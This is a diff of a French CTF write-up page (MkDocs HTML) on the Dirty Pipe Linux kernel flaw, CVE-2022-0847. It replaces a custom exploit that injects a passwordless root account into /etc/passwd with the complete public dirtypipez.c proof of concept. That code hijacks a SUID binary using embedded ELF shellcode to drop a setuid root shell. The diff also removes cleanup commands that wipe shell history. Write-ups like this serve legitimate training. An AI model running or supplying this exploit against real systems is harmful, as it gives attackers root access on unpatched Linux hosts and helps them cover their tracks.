@@ -13,7 +13,7 @@
       <script>
         // Current page data
         var mkdocs_page_name = "PROMETHEUS_9";
-        var mkdocs_page_input_path = "Systeme\\writeup_DirtyPipe_PROMETHEUS-9_v2.md";
+        var mkdocs_page_input_path = "Systeme/writeup_DirtyPipe_PROMETHEUS-9_v2.md";
         var mkdocs_page_url = null;
       </script>
     
@@ -49,9 +49,13 @@
                   </li>
                   <li class="toctree-l1"><a class="reference internal" href="../../Reseaux/Flag114-pcap-forensic/">cap-forensic-mot de passe d'un archive</a>
                   </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../Reseaux/Flag146-Packet-tracer/">Packet-tracer</a>
+                  </li>
               </ul>
               <p class="caption"><span class="caption-text">Forensic</span></p>
               <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../forensic/pdf-metadata/">PDF metadata</a>
+                  </li>
                   <li class="toctree-l1"><a class="reference internal" href="../../forensic/tier1-magic-bytes/">Tier 1 — Magic Bytes</a>
                   </li>
                   <li class="toctree-l1"><a class="reference internal" href="../../forensic/tier2-file-carving/">Tier 2 — File Carving</a>
@@ -103,8 +107,10 @@
                   </li>
                   <li class="toctree-l1"><a class="reference internal" href="../../logiciel/writeup_polygotte/">Polygotte</a>
                   </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../logiciel/emoji_jail/">Emoji_jail</a>
+                  </li>
               </ul>
-              <p class="caption"><span class="caption-text">Systeme</span></p>
+              <p class="caption"><span class="caption-text">Système Linux</span></p>
               <ul class="current">
                   <li class="toctree-l1"><a class="reference internal" href="../writeup_SUID_XENON-1/">XENON-1</a>
                   </li>
@@ -142,8 +148,6 @@
     </li>
     <li class="toctree-l2"><a class="reference internal" href="#resume-de-lattaque">Résumé de l'attaque</a>
     </li>
-    <li class="toctree-l2"><a class="reference internal" href="#nettoyage-post-ctf">Nettoyage (post-CTF)</a>
-    </li>
     <li class="toctree-l2"><a class="reference internal" href="#flags">Flags</a>
     </li>
     <li class="toctree-l2"><a class="reference internal" href="#references">Références</a>
@@ -153,6 +157,25 @@
                   <li class="toctree-l1"><a class="reference internal" href="../writeup_PwnKit_SHADOW-5/">SHADOW-5</a>
                   </li>
                   <li class="toctree-l1"><a class="reference internal" href="../writeup_PHANTOM-4/">PHANTOM-4</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Système Windows</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../windows/Flag%202%20%E2%80%94%20T%C3%A2che%20planifi%C3%A9e%20%C3%A9lev%C3%A9e/">Flag 2 — Tâche planifiée élevée</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../windows/Flag3-ACL-AD/">Flag 3 — ACL Active Directory</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../windows/Flag4-Historique-PS/">Flag 4 — Historique PowerShell</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../windows/Flag5-SMB-Share/">Flag 5 — SMB Share</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../windows/Flag6-LLMNR/">Flag 6 — LLMNR</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../windows/Flag7-KeePass/">Flag 7 — KeePass</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../windows/Flag7b-Kerberos/">Flag 7b — Kerberos</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../windows/GUIDE-COMPLET-LAB-CTF/">LAB-CTF</a>
                   </li>
               </ul>
               <p class="caption"><span class="caption-text">Misc</span></p>
@@ -174,7 +197,7 @@
         <div class="rst-content"><div role="navigation" aria-label="breadcrumbs navigation">
   <ul class="wy-breadcrumbs">
     <li><a href="../.." class="icon icon-home" aria-label="Docs"></a></li>
-          <li class="breadcrumb-item">Systeme</li>
+          <li class="breadcrumb-item">Système Linux</li>
       <li class="breadcrumb-item active">PROMETHEUS_9</li>
     <li class="wy-breadcrumbs-aside">
     </li>
@@ -280,12 +303,12 @@ Cycle 2094.20 — Note personnelle :
   Version noyau : CONFIDENTIAL
   Statut patch  : EN ATTENTE — non prioritaire
 
-  La faille : ********* depuis un fichier vers un pipe ne
+  La faille : ********* depuis un fichier vers un **** ne
   reinitialise pas le *************.
   Un ******* suivant ecrit dans le page cache du fichier
   source sans verification de permissions.
 
-  De plus, une clé est caché dans le fichier des variables de configuration du système de patrouille,
+  De plus, une clé est caché dans le fichier des ******* de configuration du système d'approvisionnement,
   mais elle est chiffrée dans le fichier de flux energetiques.
   Voici la passphrase : 'Prometheus9-Flux-Archive-2094!',
 
@@ -366,67 +389,199 @@ Page cache partagée — flag CAN_MERGE non réinitialisé
 <pre><code class="language-bash">mkdir /tmp/pipe &amp;&amp; cd /tmp/pipe
 </code></pre>
 <p><strong>Fichier <code>dirtypipe.c</code> :</strong></p>
-<pre><code class="language-c">#define _GNU_SOURCE
+<pre><code class="language-c">//
+// dirtypipez.c
+//
+// hacked up Dirty Pipe (CVE-2022-0847) PoC that hijacks a SUID binary to spawn
+// a root shell. (and attempts to restore the damaged binary as well)
+//
+// Wow, Dirty CoW reloaded!
+//
+// -- blasty &lt;peter@haxx.in&gt; // 2022-03-07
+/* SPDX-License-Identifier: GPL-2.0 */
+/*
+ * Copyright 2022 CM4all GmbH / IONOS SE
+ *
+ * author: Max Kellermann &lt;max.kellermann@ionos.com&gt;
+ *
+ * Proof-of-concept exploit for the Dirty Pipe
+ * vulnerability (CVE-2022-0847) caused by an uninitialized
+ * &quot;pipe_buffer.flags&quot; variable.  It demonstrates how to overwrite any
+ * file contents in the page cache, even if the file is not permitted
+ * to be written, immutable or on a read-only mount.
+ *
+ * This exploit requires Linux 5.8 or later; the code path was made
+ * reachable by commit f6dd975583bd (&quot;pipe: merge
+ * anon_pipe_buf*_ops&quot;).  The commit did not introduce the bug, it was
+ * there before, it just provided an easy way to exploit it.
+ *
+ * There are two major limitations of this exploit: the offset cannot
+ * be on a page boundary (it needs to write one byte before the offset
+ * to add a reference to this page to the pipe), and the write cannot
+ * cross a page boundary.
+ *
+ * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\nssh-ed25519 AAA......\n'
+ *
+ * Further explanation: https://dirtypipe.cm4all.com/
+ */
+#define _GNU_SOURCE
+#include &lt;unistd.h&gt;
+#include &lt;fcntl.h&gt;
 #include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
 #include &lt;string.h&gt;
-#include &lt;unistd.h&gt;
-#include &lt;fcntl.h&gt;
-#include &lt;errno.h&gt;
-
-static const char NEW_ROOT_LINE[] =
-    &quot;pwned::0:0:root:/root:/bin/bash\n&quot;;
-
-static int write_via_pipe(int fd, loff_t offset,
-                          const char *data, size_t len)
+#include &lt;sys/stat.h&gt;
+#include &lt;sys/user.h&gt;
+#include &lt;stdint.h&gt;
+#ifndef PAGE_SIZE
+#define PAGE_SIZE 4096
+#endif
+// small (linux x86_64) ELF file matroshka doll that does;
+//   fd = open(&quot;/tmp/sh&quot;, O_WRONLY | O_CREAT | O_TRUNC);
+//   write(fd, elfcode, elfcode_len)
+//   chmod(&quot;/tmp/sh&quot;, 04755)
+//   close(fd);
+//   exit(0);
+//
+// the dropped ELF simply does:
+//   setuid(0);
+//   setgid(0);
+//   execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;, NULL], [NULL]);
+unsigned char elfcode[] = {
+    /*0x7f,*/ 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
+    0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x97, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x97, 0x01, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x48, 0x8d, 0x3d, 0x56, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0x41, 0x02,
+    0x00, 0x00, 0x48, 0xc7, 0xc0, 0x02, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48,
+    0x89, 0xc7, 0x48, 0x8d, 0x35, 0x44, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc2,
+    0xba, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00, 0x0f,
+    0x05, 0x48, 0xc7, 0xc0, 0x03, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d,
+    0x3d, 0x1c, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0xed, 0x09, 0x00, 0x00,
+    0x48, 0xc7, 0xc0, 0x5a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff,
+    0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x2f, 0x74, 0x6d,
+    0x70, 0x2f, 0x73, 0x68, 0x00, 0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e,
+    0x00, 0x01, 0x00, 0x00, 0x00, 0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38,
+    0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
+    0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x69,
+    0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x6a,
+    0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d, 0x3d, 0x1b, 0x00, 0x00, 0x00,
+    0x6a, 0x00, 0x48, 0x89, 0xe2, 0x57, 0x48, 0x89, 0xe6, 0x48, 0xc7, 0xc0,
+    0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00,
+    0x00, 0x0f, 0x05, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00
+};
+/**
+ * Create a pipe where all &quot;bufs&quot; on the pipe_inode_info ring have the
+ * PIPE_BUF_FLAG_CAN_MERGE flag set.
+ */
+static void prepare_pipe(int p[2])
 {
-    int pipefd[2];
-    if (pipe(pipefd) &lt; 0) { perror(&quot;[-] pipe&quot;); return -1; }
-
-    // Remplir le pipe pour initialiser les pages avec le flag CAN_MERGE
-    const size_t pipe_size = 65536;
-    char *buf = malloc(pipe_size);
-    memset(buf, 0, pipe_size);
-    write(pipefd[1], buf, pipe_size);
-    read(pipefd[0], buf, pipe_size);  // Vider — le flag reste actif
-    free(buf);
-
-    // splice() depuis le fichier → partage la page cache
-    loff_t off = offset;
-    if (splice(fd, &amp;off, pipefd[1], NULL, 1, 0) &lt; 0) {
-        perror(&quot;[-] splice&quot;); return -1;
+    if (pipe(p)) abort();
+    const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
+    static char buffer[4096];
+    /* fill the pipe completely; each pipe_buffer will now have
+       the PIPE_BUF_FLAG_CAN_MERGE flag */
+    for (unsigned r = pipe_size; r &gt; 0;) {
+        unsigned n = r &gt; sizeof(buffer) ? sizeof(buffer) : r;
+        write(p[1], buffer, n);
+        r -= n;
     }
-
-    // write() → écrit dans la page cache du fichier cible
-    if (write(pipefd[1], data, len) &lt; 0) {
-        perror(&quot;[-] write payload&quot;); return -1;
+    /* drain the pipe, freeing all pipe_buffer instances (but
+       leaving the flags initialized) */
+    for (unsigned r = pipe_size; r &gt; 0;) {
+        unsigned n = r &gt; sizeof(buffer) ? sizeof(buffer) : r;
+        read(p[0], buffer, n);
+        r -= n;
     }
-
-    close(pipefd[0]);
-    close(pipefd[1]);
+    /* the pipe is now empty, and if somebody adds a new
+       pipe_buffer without initializing its &quot;flags&quot;, the buffer
+       will be mergeable */
+}
+int hax(char *filename, long offset, uint8_t *data, size_t len) {
+    /* open the input file and validate the specified offset */
+    const int fd = open(filename, O_RDONLY); // yes, read-only! :-)
+    if (fd &lt; 0) {
+        perror(&quot;open failed&quot;);
+        return -1;
+    }
+    struct stat st;
+    if (fstat(fd, &amp;st)) {
+        perror(&quot;stat failed&quot;);
+        return -1;
+    }
+    /* create the pipe with all flags initialized with
+       PIPE_BUF_FLAG_CAN_MERGE */
+    int p[2];
+    prepare_pipe(p);
+    /* splice one byte from before the specified offset into the
+       pipe; this will add a reference to the page cache, but
+       since copy_page_to_iter_pipe() does not initialize the
+       &quot;flags&quot;, PIPE_BUF_FLAG_CAN_MERGE is still set */
+    --offset;
+    ssize_t nbytes = splice(fd, &amp;offset, p[1], NULL, 1, 0);
+    if (nbytes &lt; 0) {
+        perror(&quot;splice failed&quot;);
+        return -1;
+    }
+    if (nbytes == 0) {
+        fprintf(stderr, &quot;short splice\n&quot;);
+        return -1;
+    }
+    /* the following write will not create a new pipe_buffer, but
+       will instead write into the page cache, because of the
+       PIPE_BUF_FLAG_CAN_MERGE flag */
+    nbytes = write(p[1], data, len);
+    if (nbytes &lt; 0) {
+        perror(&quot;write failed&quot;);
+        return -1;
+    }
+    if ((size_t)nbytes &lt; len) {
+        fprintf(stderr, &quot;short write\n&quot;);
+        return -1;
+    }
+    close(fd);
     return 0;
 }
-
-int main(void)
-{
-    int fd = open(&quot;/etc/passwd&quot;, O_RDONLY);
-    if (fd &lt; 0) { perror(&quot;[-] open&quot;); return 1; }
-
-    printf(&quot;[*] Injection du payload via Dirty Pipe...\n&quot;);
-
-    // offset 1 : splice requiert offset &gt; 0
-    if (write_via_pipe(fd, 1, NEW_ROOT_LINE + 1,
-                       strlen(NEW_ROOT_LINE) - 1) &lt; 0) {
-        fprintf(stderr, &quot;[-] Échec\n&quot;);
-        close(fd);
-        return 1;
+int main(int argc, char **argv) {
+    if (argc != 2) {
+        fprintf(stderr, &quot;Usage: %s SUID\n&quot;, argv[0]);
+        return EXIT_FAILURE;
     }
-
+    char *path = argv[1];
+    uint8_t *data = elfcode;
+    int fd = open(path, O_RDONLY);
+    uint8_t *orig_bytes = malloc(sizeof(elfcode));
+    lseek(fd, 1, SEEK_SET);
+    read(fd, orig_bytes, sizeof(elfcode));
     close(fd);
-    printf(&quot;[+] /etc/passwd modifié !\n&quot;);
-    system(&quot;head -1 /etc/passwd&quot;);
-    system(&quot;su pwned -c 'id &amp;&amp; cat /root/flag.txt'&quot;);
-    return 0;
+    printf(&quot;[+] hijacking suid binary..\n&quot;);
+    if (hax(path, 1, elfcode, sizeof(elfcode)) != 0) {
+        printf(&quot;[~] failed\n&quot;);
+        return EXIT_FAILURE;
+    }
+    printf(&quot;[+] dropping suid shell..\n&quot;);
+    system(path);
+    printf(&quot;[+] restoring suid binary..\n&quot;);
+    if (hax(path, 1, orig_bytes, sizeof(elfcode)) != 0) {
+        printf(&quot;[~] failed\n&quot;);
+        return EXIT_FAILURE;
+    }
+    printf(&quot;[+] popping root shell.. (dont forget to clean up /tmp/sh ;))\n&quot;);
+    system(&quot;/tmp/sh&quot;);
+    return EXIT_SUCCESS;
 }
 </code></pre>
 <h3 id="etape-6-compilation-et-execution">Étape 6 — Compilation et exécution</h3>
@@ -453,12 +608,6 @@ CryptAbyss{D1RTY_P1P3_PR0M3TH3US_C0R3_RUPTUR3D}
 root shell (uid=0)
     ↓ cat /root/flag.txt
 CryptAbyss{D1RTY_P1P3_PR0M3TH3US_C0R3_RUPTUR3D}
-</code></pre>
-<hr />
-<h2 id="nettoyage-post-ctf">Nettoyage (post-CTF)</h2>
-<pre><code class="language-bash">su pwned -c &quot;sed -i '1s/.*/root:x:0:0:root:\/root:\/bin\/bash/' /etc/passwd&quot;
-rm -rf /tmp/pipe
-history -c &amp;&amp; rm ~/.bash_history
 </code></pre>
 <hr />
 <h2 id="flags">Flags</h2>
@@ -490,6 +639,7 @@ history -c &amp;&amp; rm ~/.bash_history
 <li><a href="https://dirtypipe.cm4all.com/">Article original de Max Kellermann</a></li>
 <li><a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=9d2231c5d74e13b2a0546fee6737ee4446017903">Patch noyau Linux upstream</a></li>
 <li><a href="https://ubuntu.com/security/notices/USN-5317-1">Ubuntu Security Notice USN-5317-1</a></li>
+<li>[Github de l'exploit]https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/tree/main</li>
 </ul>
               
             </div>
